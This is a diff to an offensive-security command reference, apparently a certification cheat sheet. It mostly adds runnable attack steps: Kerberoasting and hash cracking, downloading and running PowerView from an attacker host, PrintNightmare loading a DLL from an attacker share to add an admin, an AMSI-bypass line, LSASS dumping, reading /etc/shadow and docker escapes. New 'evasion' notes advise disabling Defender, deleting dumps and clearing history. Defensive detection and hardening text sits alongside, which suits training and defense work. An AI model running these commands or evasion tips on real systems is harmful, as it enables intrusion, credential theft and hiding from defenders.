+          "label": "Export for review",
+          "command": "Find-InterestingDomainAcl -ResolveGUIDs | Export-Csv acls.csv -NoTypeInformation"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Enumerate interesting domain ACLs",
+          "command": "Find-InterestingDomainAcl -ResolveGUIDs"
+        },
+        {
+          "label": "Filter to your principals + note the right (GenericAll/WriteDacl/ForceChangePassword)",
+          "command": "# pick the abuse: add-member / reset-password / targeted-kerberoast / RBCD"
+        }
       ]
     },
     {
@@ -51515,7 +54263,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "PowerView Get-DomainUser -SPN lists SPN accounts for Kerberoasting.",
+        "why_it_works": "In Active Directory the default security descriptor grants the built-in 'Authenticated Users' group read access to nearly every directory object (users, groups, computers, GPOs, trusts) and their attributes. So any valid domain account — however low-privileged — can enumerate the whole directory over LDAP/SAMR without hitting access-denied, which is why this returns data without needing admin. Filtering users by serviceprincipalname reveals the Kerberoastable accounts.",
         "prerequisites": "Valid domain credentials (any authenticated user) and network access to a DC (LDAP 389/636).",
         "impact": "The Kerberoastable account list.",
         "detection": "[MITRE T1087.002] Broad/bulk LDAP queries to the DC (Event 4662 directory-service access; Microsoft Defender for Identity reconnaissance alerts); one host reading large swaths of the directory in a short window.",
@@ -51532,6 +54280,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PowerView"
+      ],
+      "variations": [
+        {
+          "label": "Then roast",
+          "command": "Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat"
+        }
       ]
     },
     {
@@ -51603,7 +54357,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "PowerView Get-DomainSPNTicket (or Invoke-Kerberoast) requests a TGS for an SPN account and outputs the crackable hash.",
+        "why_it_works": "Requesting a TGS for an SPN returns a ticket encrypted with the service account's NT hash; PowerView formats it for hashcat. Works for any user because TGS issuance isn't privileged.",
         "prerequisites": "Valid domain credentials and PowerView in the session.",
         "impact": "A crackable TGS hash for the targeted service account.",
         "detection": "[MITRE T1558.003] Event 4769 (TGS requested) with RC4 encryption type (0x17) when AES is standard, or a burst of TGS requests for many SPNs from one source in a short window; a request for a honeypot SPN account is malicious by definition.",
@@ -51620,6 +54374,30 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PowerView"
+      ],
+      "variations": [
+        {
+          "label": "All SPN users at once",
+          "command": "Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv hashes.csv -NoTypeInformation"
+        },
+        {
+          "label": "Single user",
+          "command": "Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat | fl"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Find SPN accounts",
+          "command": "Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname"
+        },
+        {
+          "label": "Request TGS in hashcat format",
+          "command": "Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | select -Expand Hash > hashes.txt"
+        },
+        {
+          "label": "Crack offline",
+          "command": "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt"
+        }
       ]
     },
     {
@@ -51694,7 +54472,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "Get-DomainGroupMember enumerates group membership (e.g. Domain Admins) to find privileged accounts.",
+        "why_it_works": "In Active Directory the default security descriptor grants the built-in 'Authenticated Users' group read access to nearly every directory object (users, groups, computers, GPOs, trusts) and their attributes. So any valid domain account — however low-privileged — can enumerate the whole directory over LDAP/SAMR without hitting access-denied, which is why this returns data without needing admin. Group membership is readable, and -Recurse resolves nested groups to find the true effective members of privileged groups.",
         "prerequisites": "Valid domain credentials (any authenticated user) and network access to a DC (LDAP 389/636).",
         "impact": "The membership of privileged groups - the high-value targets.",
         "detection": "[MITRE T1087.002] Broad/bulk LDAP queries to the DC (Event 4662 directory-service access; Microsoft Defender for Identity reconnaissance alerts); one host reading large swaths of the directory in a short window.",
@@ -51711,6 +54489,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PowerView"
+      ],
+      "variations": [
+        {
+          "label": "Domain Admins recursively",
+          "command": "Get-DomainGroupMember -Identity 'Domain Admins' -Recurse | select MemberName"
+        }
       ]
     },
     {
@@ -51778,7 +54562,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "Get-DomainTrust / Get-ForestTrust maps trust relationships for cross-domain/forest attack paths.",
+        "why_it_works": "In Active Directory the default security descriptor grants the built-in 'Authenticated Users' group read access to nearly every directory object (users, groups, computers, GPOs, trusts) and their attributes. So any valid domain account — however low-privileged — can enumerate the whole directory over LDAP/SAMR without hitting access-denied, which is why this returns data without needing admin. Trust objects are readable; Get-DomainTrustMapping walks them recursively to draw the full inter-domain/forest trust graph.",
         "prerequisites": "Valid domain credentials (any authenticated user) and network access to a DC (LDAP 389/636).",
         "impact": "A trust map for lateral movement across domains.",
         "detection": "[MITRE T1087.002] Broad/bulk LDAP queries to the DC (Event 4662 directory-service access; Microsoft Defender for Identity reconnaissance alerts); one host reading large swaths of the directory in a short window.",
@@ -51795,6 +54579,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PowerView"
+      ],
+      "variations": [
+        {
+          "label": "External trusts only",
+          "command": "Get-DomainTrust | ?{$_.TrustAttributes -notmatch 'WITHIN_FOREST'}"
+        }
       ]
     },
     {
@@ -51874,7 +54664,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "PowerView Get-DomainUser enumerates domain users and their attributes (SPNs, flags, description, last logon) via LDAP.",
+        "why_it_works": "In Active Directory the default security descriptor grants the built-in 'Authenticated Users' group read access to nearly every directory object (users, groups, computers, GPOs, trusts) and their attributes. So any valid domain account — however low-privileged — can enumerate the whole directory over LDAP/SAMR without hitting access-denied, which is why this returns data without needing admin. PowerView wraps the same LDAP reads with convenient filtering (admincount, SPN, description) any user can perform.",
         "prerequisites": "Valid domain credentials (any authenticated user) and network access to a DC (LDAP 389/636).",
         "impact": "A detailed user inventory revealing roasting targets, stale accounts, and embedded secrets.",
         "detection": "[MITRE T1087.002] Broad/bulk LDAP queries to the DC (Event 4662 directory-service access; Microsoft Defender for Identity reconnaissance alerts); one host reading large swaths of the directory in a short window.",
@@ -51891,6 +54681,16 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PowerView"
+      ],
+      "variations": [
+        {
+          "label": "All users, key props",
+          "command": "Get-DomainUser -Properties samaccountname,description,memberof,admincount | select samaccountname,description"
+        },
+        {
+          "label": "Only privileged (admincount=1)",
+          "command": "Get-DomainUser -AdminCount | select samaccountname"
+        }
       ]
     },
     {
@@ -51962,7 +54762,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "Imports PowerView (PowerSploit) into the session, providing rich AD enumeration and abuse cmdlets.",
+        "why_it_works": "PowerView is a pure-PowerShell LDAP client; importing it (dot-sourcing) just loads functions — it needs no special privilege because it only performs reads any user can do.",
         "prerequisites": "A PowerShell session on a domain host (PowerView is third-party).",
         "impact": "A powerful AD enumeration toolkit loaded in memory.",
         "detection": "[MITRE T1059.001] PowerView is a well-known offensive script - script-block logging (4104) and AMSI catch its functions; loading it is itself a signal.",
@@ -51979,6 +54779,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PowerView"
+      ],
+      "variations": [
+        {
+          "label": "Load fileless (after AMSI bypass)",
+          "command": "iex (New-Object Net.WebClient).DownloadString('http://<attacker>/PowerView.ps1')"
+        }
       ]
     },
     {
@@ -52061,6 +54867,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PowerView"
+      ],
+      "variations": [
+        {
+          "label": "Filter to non-empty descriptions",
+          "command": "Get-DomainUser * | ?{$_.description} | Select samaccountname,description"
+        }
       ]
     },
     {
@@ -52149,6 +54961,30 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PowerView"
+      ],
+      "variations": [
+        {
+          "label": "Revert the SPN after roasting",
+          "command": "Set-DomainObject -Credential $Cred -Identity <target> -Clear serviceprincipalname"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Confirm GenericWrite/GenericAll on the target",
+          "command": "Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match '<user>'}"
+        },
+        {
+          "label": "Set a fake SPN on the target",
+          "command": "Set-DomainObject -Credential $Cred -Identity <target> -SET @{serviceprincipalname='nonexistent/BLAH'}"
+        },
+        {
+          "label": "Kerberoast it",
+          "command": ".\\Rubeus.exe kerberoast /user:<target> /nowrap"
+        },
+        {
+          "label": "Crack + then remove the SPN",
+          "command": "hashcat -m 13100 hash.txt rockyou.txt ; Set-DomainObject -Identity <target> -Clear serviceprincipalname"
+        }
       ]
     },
     {
@@ -52238,6 +55074,22 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PowerView"
+      ],
+      "variations": [
+        {
+          "label": "Across a host list",
+          "command": "Get-DomainComputer | %{ Test-AdminAccess -ComputerName $_.dnshostname }"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Find where your user is local admin",
+          "command": "Get-DomainComputer -Properties dnshostname | %{ if(Test-AdminAccess -ComputerName $_.dnshostname){$_.dnshostname} }"
+        },
+        {
+          "label": "Move laterally to those hosts",
+          "command": "# PSRemoting / wmiexec, then dump creds"
+        }
       ]
     },
     {
@@ -52440,7 +55292,17 @@ const COMMAND_DATA = {
         "misconfiguration": "Script Block Logging disabled. AMSI not enforced/updated. CLM not applied to workstations. MDI absent.",
         "vulnerable_config": "# Script Block Logging disabled:\n# HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\n# EnableScriptBlockLogging = 0 (or key absent)\n\n# AMSI bypass succeeds — not patched:\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
         "secure_config": "# Enable Script Block Logging via GPO:\n# Computer Config → Admin Templates → Windows Components → Windows PowerShell\n# → Turn on Script Block Logging: Enabled\n\n# WDAC AllowMicrosoft policy → CLM on non-admin hosts\n\n# SIEM alert on PowerView function names in Event 4104:\n# EventID=4104 AND ScriptBlockText contains ('Get-DomainController' OR 'Get-NetGPO')"
-      }
+      },
+      "variations": [
+        {
+          "label": "Domain controllers",
+          "command": "Get-DomainController -Domain <domain>"
+        },
+        {
+          "label": "Domain SID",
+          "command": "Get-DomainSID"
+        }
+      ]
     },
     {
       "id": "crtp-powerview-trusts",
@@ -52534,7 +55396,21 @@ const COMMAND_DATA = {
         "misconfiguration": "Forest trust with SID filtering disabled — allows SID History injection across forest boundary. Bidirectional trust where unidirectional was intended. External trust without quarantine.",
         "vulnerable_config": "# Check SID filtering on forest trust:\nGet-ADTrust -Filter * | Select Name,TrustType,TrustDirection,SIDFilteringForestAware\n# SIDFilteringForestAware = False → SID filtering DISABLED → VULNERABLE\n\n# With SID filtering off, attacker can forge ticket with parent DA SID:\n# krbtgt hash + SID history injection = cross-forest DA",
         "secure_config": "# Enable SID filtering on forest trust:\nnetdom trust ChildDomain.corp.local /domain:corp.local /enablesidhistory:no /filtersids:yes\n\n# Verify:\n(Get-ADTrust -Filter {Target -eq 'ChildDomain.corp.local'}).SIDFilteringForestAware  # Should be True\n\n# Quarantine external trusts:\nnetdom trust ExternalDomain /domain:corp.local /quarantine:yes\n\n# Audit quarterly:\nGet-ADTrust -Filter * | Format-Table Name,TrustType,TrustDirection,SIDFilteringForestAware -AutoSize"
-      }
+      },
+      "variations": [
+        {
+          "label": "Forest object",
+          "command": "Get-Forest -Forest <forest>"
+        },
+        {
+          "label": "Forest global catalogs",
+          "command": "Get-ForestGlobalCatalog -Forest <forest>"
+        },
+        {
+          "label": "Forest trusts (external/forest)",
+          "command": "Get-ForestTrust -Forest <forest>"
+        }
+      ]
     },
     {
       "id": "crtp-powerview-userhunting",
@@ -52976,7 +55852,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1543.003",
           "MITRE T1068"
-        ]
+        ],
+        "evasion": "Load the driver for execution then remove it; SeLoadDriver abuse is a single event — do it once."
       }
     },
     {
@@ -53159,8 +56036,33 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1068",
           "MITRE T1547.012"
-        ]
-      }
+        ],
+        "evasion": "Run the PoC in-memory (reflective load) rather than dropping the EXE; disable/neuter Defender first if you already have admin; rename the binary to dodge static IOCs; kernel PoCs are unstable — test against a snapshot to avoid crashing the target."
+      },
+      "variations": [
+        {
+          "label": "Local (CVE-2021-1675) - add admin",
+          "command": "Invoke-Nightmare -NewUser \"<user>\" -NewPassword \"<password>\""
+        },
+        {
+          "label": "Remote (Impacket) DLL drop",
+          "command": "python3 CVE-2021-1675.py <domain>/<user>:<password>@<target> '\\\\<attacker>\\share\\evil.dll'"
+        },
+        {
+          "label": "Mimikatz misc::printnightmare",
+          "command": "misc::printnightmare /server:<target> /library:\\\\<attacker>\\share\\evil.dll"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Confirm Print Spooler is running",
+          "command": "Get-Service Spooler"
+        },
+        {
+          "label": "Exploit to run SYSTEM code",
+          "command": "Invoke-Nightmare -NewUser \"hacker\" -NewPassword \"P@ssw0rd!\""
+        }
+      ]
     },
     {
       "id": "ad-printnightmare",
@@ -53243,6 +56145,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "impacket"
+      ],
+      "variations": [
+        {
+          "label": "Local (add admin)",
+          "command": "Invoke-Nightmare -NewUser <user> -NewPassword <password>"
+        }
       ]
     },
     {
@@ -53602,7 +56510,8 @@ const COMMAND_DATA = {
         "sources": [
           "MITRE T1548.003",
           "HTB Academy - Getting Started Module"
-        ]
+        ],
+        "evasion": "Use the GTFOBins one-shot that spawns a shell without writing files; remove any dropped .so/binary; the sudo call is logged, so do it once and pivot rather than repeating."
       },
       "certifications": [
         "CPTS"
@@ -53690,8 +56599,25 @@ const COMMAND_DATA = {
           "HTB M25",
           "MITRE T1078.001",
           "MITRE T1083"
-        ]
-      }
+        ],
+        "evasion": "Use a single container/mount escape that reads what you need and exits; remove images/containers you created (docker rmi / lxc delete); avoid leaving a privileged container running."
+      },
+      "variations": [
+        {
+          "label": "Read shadow via debugfs",
+          "command": "debugfs -R 'cat /etc/shadow' /dev/sda1"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Raw-read the disk (disk group)",
+          "command": "debugfs /dev/sda1"
+        },
+        {
+          "label": "Extract /etc/shadow and crack",
+          "command": "debugfs -R 'cat /etc/shadow' /dev/sda1 | tee shadow"
+        }
+      ]
     },
     {
       "type": "command",
@@ -53789,8 +56715,29 @@ const COMMAND_DATA = {
           "HTB M25",
           "MITRE T1610",
           "MITRE T1611"
-        ]
-      }
+        ],
+        "evasion": "Use a single container/mount escape that reads what you need and exits; remove images/containers you created (docker rmi / lxc delete); avoid leaving a privileged container running."
+      },
+      "variations": [
+        {
+          "label": "Mount host root + chroot",
+          "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+        },
+        {
+          "label": "Read a root file directly",
+          "command": "docker run -v /:/mnt --rm -it alpine cat /mnt/root/root.txt"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Confirm docker group membership",
+          "command": "id | grep docker"
+        },
+        {
+          "label": "Escape to root via a bind-mount",
+          "command": "docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash"
+        }
+      ]
     },
     {
       "type": "command",
@@ -53889,8 +56836,15 @@ const COMMAND_DATA = {
           "HTB M25",
           "MITRE T1610",
           "MITRE T1611"
-        ]
-      }
+        ],
+        "evasion": "Use a single container/mount escape that reads what you need and exits; remove images/containers you created (docker rmi / lxc delete); avoid leaving a privileged container running."
+      },
+      "variations": [
+        {
+          "label": "Use a static docker binary against the socket",
+          "command": "/tmp/docker -H unix:///app/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
+        }
+      ]
     },
     {
       "type": "command",
@@ -53994,8 +56948,15 @@ const COMMAND_DATA = {
           "HTB M25",
           "MITRE T1610",
           "MITRE T1611"
-        ]
-      }
+        ],
+        "evasion": "Use a single container/mount escape that reads what you need and exits; remove images/containers you created (docker rmi / lxc delete); avoid leaving a privileged container running."
+      },
+      "variations": [
+        {
+          "label": "Import a prebuilt alpine image",
+          "command": "lxc image import alpine.tar.gz alpine.tar.gz.root --alias r00t"
+        }
+      ]
     },
     {
       "type": "command",
@@ -54186,7 +57147,13 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy — direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
         "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering — block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring — detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection — detect reverse tunnels in HTTPS streams"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Quiet mode",
+          "command": "proxychains -q <command>"
+        }
+      ]
     },
     {
       "type": "payload",
@@ -54252,6 +57219,11 @@ const COMMAND_DATA = {
           "id": "other-apps-defaults",
           "note": "Try default prtgadmin creds to reach the console.",
           "rel": "prereq"
+        },
+        {
+          "id": "gs-reverse-shells",
+          "rel": "next",
+          "note": "Use the command injection to catch a reverse shell"
         }
       ],
       "id": "prtg-notification-rce",
@@ -54280,7 +57252,8 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "MITRE T1059",
           "OWASP A03:2021"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): user input reaches a shell/exec call.\n  system( / exec( / shell_exec( / passthru( / popen( / proc_open(  |  os.system / subprocess(..., shell=True)  |  child_process.exec(  |  backticks `...`\nGREP:  grep -rniE \"system\\(|exec\\(|shell_exec|passthru|popen|proc_open|os\\.system|subprocess.*shell=True|child_process\\.exec\\(|`.*\\$\" .\nSAFE:  avoid the shell; use argument arrays / execve-style APIs (subprocess.run([...], shell=False)); strict allowlist; escapeshellarg only as last resort."
       }
     },
     {
@@ -54362,6 +57335,30 @@ const COMMAND_DATA = {
       },
       "tools": [
         "impacket"
+      ],
+      "variations": [
+        {
+          "label": "wmiexec with ticket",
+          "command": "KRB5CCNAME=<ccache> wmiexec.py -k -no-pass <domain>/<user>@<target_fqdn>"
+        },
+        {
+          "label": "smbexec with ticket",
+          "command": "KRB5CCNAME=<ccache> smbexec.py -k -no-pass <domain>/<user>@<target_fqdn>"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Export the ticket for Impacket",
+          "command": "export KRB5CCNAME=<ccache>"
+        },
+        {
+          "label": "Confirm it's loaded",
+          "command": "klist"
+        },
+        {
+          "label": "Get a shell with the ticket",
+          "command": "psexec.py -k -no-pass <domain>/<user>@<target_fqdn> -target-ip <target_ip>"
+        }
       ]
     },
     {
@@ -54474,7 +57471,7 @@ const COMMAND_DATA = {
     {
       "id": "pypykatz-minidump",
       "name": "Pypykatz - Parse LSASS Dump",
-      "command": "pypykatz lsa minidump <lsass.dmp>",
+      "command": "pypykatz lsa minidump <dump_file>",
       "description": "Parses an LSASS minidump offline (a pure-Python Mimikatz reimplementation) to recover NT hashes, and sometimes cleartext passwords and Kerberos keys, without running tooling on the target. Crack recovered NT hashes with Hashcat mode 1000.",
       "platform": "linux",
       "requires": [
@@ -54533,7 +57530,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "pypykatz parses an LSASS minidump OFFLINE (no mimikatz on the host) to extract credentials, hashes, and tickets.",
+        "why_it_works": "An LSASS memory dump contains the same secrets Mimikatz reads live; pypykatz parses them offline in Python, so no offensive tool runs on the victim.",
         "prerequisites": "An LSASS .dmp file already obtained from the target.",
         "impact": "Credentials/hashes/tickets recovered from the dump - offline, on the attacker box.",
         "detection": "The credential-access risk was the LSASS dump itself; pypykatz runs offline on the attacker host, so there is no victim-side detection at this step.",
@@ -54545,9 +57542,30 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Credential material is accessible in multiple locations: SAM/NTDS.DIT via registry hives or VSS, LSASS minidump via Task Manager (non-admin on some configs), cached credentials in Windows Credential Manager (cmdkey), /etc/shadow readable by non-root. Offline attacks succeed because credentials are stored with weak hashing algorithms.",
         "vulnerable_config": "# Windows Credential Manager stores cleartext/encrypted creds:\ncmdkey /list\n# Manages: Domain:interactive=CORP\\svcaccount  (recoverable with DPAPI)\n\n# /etc/shadow accessible (bad permissions):\nls -la /etc/shadow  # -rw-r--r-- 1 root shadow (group-readable)\n# SHA-512 hashes: crackable with hashcat -m 1800",
-        "secure_config": "# Windows: Credential Guard (prevents LSASS access)\n# Audit Credential Manager entries:\ncmdkey /list  # remove any unnecessary stored creds\n\n# Linux /etc/shadow permissions:\nchmod 640 /etc/shadow   # root:shadow only\nchmod 400 /etc/shadow   # even stricter: root read-only\n\n# Use yescrypt (default in Ubuntu 22+) instead of SHA-512:\n# /etc/login.defs: ENCRYPT_METHOD YESCRYPT  (memory-hard, much slower to crack)\n# Existing hashes: force password reset to migrate\n\n# Disable NTLM where possible (reduces hash theft value)\n# Enforce Kerberos AES (makes captured hashes harder to crack)"
+        "secure_config": "# Windows: Credential Guard (prevents LSASS access)\n# Audit Credential Manager entries:\ncmdkey /list  # remove any unnecessary stored creds\n\n# Linux /etc/shadow permissions:\nchmod 640 /etc/shadow   # root:shadow only\nchmod 400 /etc/shadow   # even stricter: root read-only\n\n# Use yescrypt (default in Ubuntu 22+) instead of SHA-512:\n# /etc/login.defs: ENCRYPT_METHOD YESCRYPT  (memory-hard, much slower to crack)\n# Existing hashes: force password reset to migrate\n\n# Disable NTLM where possible (reduces hash theft value)\n# Enforce Kerberos AES (makes captured hashes harder to crack)",
+        "evasion": "Dump LSASS to a file with a LOLBAS (comsvcs.dll MiniDump) or an evasive tool (nanodump) and PARSE OFFLINE so Mimikatz never runs on the host; bypass/►check RunAsPPL first; delete the .dmp after; for DCSync prefer -just-dc-user krbtgt over a full dump to touch fewer objects and generate one 4662 instead of many."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Parse live LSA (needs SeDebug on-host)",
+          "command": "pypykatz live lsa"
+        },
+        {
+          "label": "From registry hives",
+          "command": "pypykatz registry --sam sam.save system.save"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Dump LSASS (any method)",
+          "command": "rundll32 comsvcs.dll, MiniDump <pid> lsass.dmp full"
+        },
+        {
+          "label": "Parse the dump offline",
+          "command": "pypykatz lsa minidump lsass.dmp"
+        }
+      ]
     },
     {
       "type": "command",
@@ -54660,7 +57678,8 @@ const COMMAND_DATA = {
           "HTB M25",
           "MITRE T1574.006",
           "MITRE T1548.003"
-        ]
+        ],
+        "evasion": "Place the hijack file, trigger once, then remove it and restore the path so the change is transient."
       }
     },
     {
@@ -54733,10 +57752,6 @@ const COMMAND_DATA = {
       "description": "Legacy r-services (rlogin/rsh/rexec) trust hosts listed in .rhosts/hosts.equiv. A wildcard (+) entry lets anyone log in without a password.",
       "variations": [
         {
-          "label": "Scan r-services",
-          "command": "sudo nmap -sV -p 512,513,514 <ip>"
-        },
-        {
           "label": "rlogin",
           "command": "rlogin <ip> -l <user>"
         },
@@ -54763,7 +57778,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Services expose excessive information: version banners, supported auth methods, valid usernames via error responses. IPMI has no authentication (version 2.0 cipher 0 vulnerability). RSH/rexec trust .rhosts files. rsync shares readable anonymously. Oracle TNS allows remote poisoning in older versions.",
         "vulnerable_config": "# IPMI cipher 0 — no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data — auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS — version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
-        "secure_config": "# IPMI — disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync — require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec — disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS — disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)"
+        "secure_config": "# IPMI — disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync — require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec — disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS — disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)",
+        "evasion": "Use key/valid-cred auth so it blends with admin activity; avoid writing tools to disk — pipe commands over the session; clean shell history."
       }
     },
     {
@@ -54845,6 +57861,22 @@ const COMMAND_DATA = {
       },
       "tools": [
         "impacket"
+      ],
+      "variations": [
+        {
+          "label": "Pass-the-hash instead of password",
+          "command": "raiseChild.py -target-exec <parent_dc_ip> <child_domain>/<child_admin> -hashes <lm>:<nt>"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Automated child->parent (DCSync + golden + psexec)",
+          "command": "raiseChild.py -target-exec <parent_dc_ip> <child_domain>/<child_admin>:<password>"
+        },
+        {
+          "label": "Confirm EA on the parent",
+          "command": "# raiseChild drops a SYSTEM shell on the forest root DC"
+        }
       ]
     },
     {
@@ -54921,10 +57953,6 @@ const COMMAND_DATA = {
       "description": "Scan RDP with the rdp* NSE scripts, assess its security config with rdp-sec-check, then connect with xfreerdp.",
       "variations": [
         {
-          "label": "Nmap RDP scripts",
-          "command": "nmap -sV -sC <ip> -p3389 --script rdp*"
-        },
-        {
           "label": "rdp-sec-check",
           "command": "git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check\n./rdp-sec-check.pl <ip>"
         },
@@ -54950,7 +57978,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "RDP (TCP 3389) is exposed to the internet or internal networks without NLA (Network Level Authentication), allowing unauthenticated brute force at the login screen. Session hijacking exploits the Windows tscon.exe utility which can reconnect disconnected sessions without a password when run as SYSTEM.",
         "vulnerable_config": "# RDP without NLA — authentication happens INSIDE the session (post-connection):\n# Attacker can reach the Windows login screen without any prior auth\n# Enables brute force + BlueKeep/DejaBlue exploitation\n\n# Disconnected sessions hijackable:\n# > query session  -> shows disconnected admin session\n# > tscon <ID> /dest:console  (as SYSTEM) -> hijacks session without password",
-        "secure_config": "# Enable NLA:\n# Group Policy: Computer Config -> Admin Templates -> Windows Components -> RDS\n#   'Require NLA' = Enabled\n# Registry: HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\n#   UserAuthentication = 1\n\n# Restrict RDP access:\nNew-NetFirewallRule -Name 'RDP Allow' -Protocol TCP -LocalPort 3389 \\\n    -RemoteAddress 10.10.1.0/24 -Action Allow\nNew-NetFirewallRule -Name 'RDP Block' -Protocol TCP -LocalPort 3389 -Action Block\n\n# Prevent session hijacking:\n# Enable RDP session timeouts + automatic logoff for disconnected sessions\n# GPO: Disconnect + log off after 15 minutes idle"
+        "secure_config": "# Enable NLA:\n# Group Policy: Computer Config -> Admin Templates -> Windows Components -> RDS\n#   'Require NLA' = Enabled\n# Registry: HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\n#   UserAuthentication = 1\n\n# Restrict RDP access:\nNew-NetFirewallRule -Name 'RDP Allow' -Protocol TCP -LocalPort 3389 \\\n    -RemoteAddress 10.10.1.0/24 -Action Allow\nNew-NetFirewallRule -Name 'RDP Block' -Protocol TCP -LocalPort 3389 -Action Block\n\n# Prevent session hijacking:\n# Enable RDP session timeouts + automatic logoff for disconnected sessions\n# GPO: Disconnect + log off after 15 minutes idle",
+        "evasion": "WinRM with valid creds looks like normal management; avoid dropping tools — run built-ins over the session; clear PSReadline history on the remote host after."
       }
     },
     {
@@ -55121,7 +58150,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Online brute-force/guessing of RDP credentials to gain a graphical session.",
+        "why_it_works": "The service performs no (or weak) rate-limiting/lockout, so an attacker can submit many username/password guesses. Password reuse and weak/default passwords mean a modest wordlist often lands a valid credential. RDP accepts logon attempts; without account lockout/NLA throttling, guessing is viable.",
